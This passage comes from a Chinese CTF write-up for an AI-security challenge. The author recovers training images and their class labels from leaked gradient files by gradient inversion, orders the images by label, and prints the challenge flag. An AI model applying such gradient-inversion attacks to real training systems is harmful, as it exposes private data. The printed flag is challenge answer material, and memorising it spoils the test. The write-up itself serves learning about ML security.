    # 保存图像
    plt.figure(figsize=(12, 8))
    for i, img in enumerate(history[:30]):
        plt.subplot(3, 10, i + 1)
        plt.imshow(img.permute(1, 2, 0).clip(0, 1))
        plt.title(f"it={i * 10}")
        plt.axis('off')
    plt.tight_layout()
    plt.savefig(out_path)
    plt.close()

    # 输出标签（可选）
    with torch.no_grad():
        final_probs = F.softmax(dummy_label, dim=-1)
        recovered_class = torch.argmax(final_probs, dim=-1).item()
    print(f"{grad_file} -> Class: {recovered_class}")

```



然后就能预测图像了。

注意预测过程中，有些图像会因为迭代次数过大而“矫枉过正”，所以针对某些损失依旧很大的图像可以适当降低迭代次数，单独进行训练。

![image-20250504223254918](image-20250504223254918.png)

最后恢复出了的图像如下：

<img src="3.png" alt="3" style="zoom:25%;" /><img src="1.png" alt="1" style="zoom:25%;" /><img src="2.png" alt="2" style="zoom:25%;" />

<img src="31.png" alt="31" style="zoom:25%;" /><img src="32.png" alt="32" style="zoom:25%;" /><img src="4.png" alt="4" style="zoom:25%;" />

<img src="5.png" alt="5" style="zoom:25%;" /><img src="6.png" alt="6" style="zoom:25%;" /><img src="7.png" alt="7" style="zoom:25%;" />

<img src="8.png" alt="8" style="zoom:25%;" /><img src="9.png" alt="9" style="zoom:25%;" /><img src="10.png" alt="10" style="zoom:25%;" />

<img src="11.png" alt="11" style="zoom:25%;" /><img src="12.png" alt="12" style="zoom:25%;" /><img src="13.png" alt="13" style="zoom:25%;" />

<img src="14.png" alt="14" style="zoom:25%;" /><img src="15.png" alt="15" style="zoom:25%;" /><img src="16.png" alt="16" style="zoom:25%;" />

<img src="17.png" alt="17" style="zoom:25%;" /><img src="18.png" alt="18" style="zoom:25%;" /><img src="19.png" alt="19" style="zoom:25%;" />

<img src="20.png" alt="20" style="zoom:25%;" /><img src="21.png" alt="21" style="zoom:25%;" /><img src="22.png" alt="22" style="zoom:25%;" />

<img src="23.png" alt="23" style="zoom:25%;" /><img src="24.png" alt="24" style="zoom:25%;" /><img src="25.png" alt="25" style="zoom:25%;" />

<img src="26.png" alt="26" style="zoom:25%;" /><img src="27.png" alt="27" style="zoom:25%;" /><img src="28.png" alt="28" style="zoom:25%;" />

<img src="29.png" alt="29" style="zoom:25%;" /><img src="30.png" alt="30" style="zoom:25%;" />

数据处理的比较乱。。。

恢复出来发现并不是顺序可读的flag。

想到了用时间判断梯度生成的先后，结果发现精确到毫秒级所有样本都是一模一样的。然后问ai说可以通过损失判断训练的先后，因为损失一般是收敛的，但并没有观察出什么规律。又莫名其妙发现.grad可以解压，有个serialization_id，还以为和梯度顺序有关，但其实只是训练设备的标号。最后才知道顺序和标签有关——

（又重新训了一遍数据看标签的值）

```python 
# 6. 输出恢复标签
with torch.no_grad():
    final_probs = F.softmax(dummy_label, dim=-1)
    recovered_class = torch.argmax(final_probs, dim=-1).item()
print("Recovered class label:", recovered_class)
```

这个标签代表了梯度的顺序。

需要注意的是，如果迭代时损失比较大，可能就不能使标签收敛到正确的值。所以也需要再调整迭代次数重新训练。

因为数据处理的比较乱，则列了一个表格记录标签值

![image-20250504224517508](image-20250504224517508.png)

最后一个样本在恢复标签值时始终找不到合适的迭代次数，但好在通过标签值排序后已经恢复出了flag的大意：R1ck likes ai security，所以便没有重新训练该样本。

历经千辛万苦得到了flag：

```
Flag: W4terCTF{R1ck_iik35_41_53cur17y}
```

虽然课没好好上，但是通过这次ai安全的题目感觉把之前欠的都补回来了。

# 小结

在比赛中的成长只有靠写WP才能沉淀。但是太拖延了几乎比完赛才开始动笔写。

虽然只能做做简单题，但是能坚持在五一打比赛已经很了不起了😭😭👍

相比去年只做出一道题，今年进步也算不小了，虽然有不少的功劳出自ai和出题人。（出题人们真的好强，真是学到了不少东西）

感谢队友的鼎力相助，看到队友能挑战pwn题和hard题——仰慕.jpg

比赛过的很快，五一也过得很快。是时候该补作业了。

## 后记
压线过二等。

![alt text](list.png)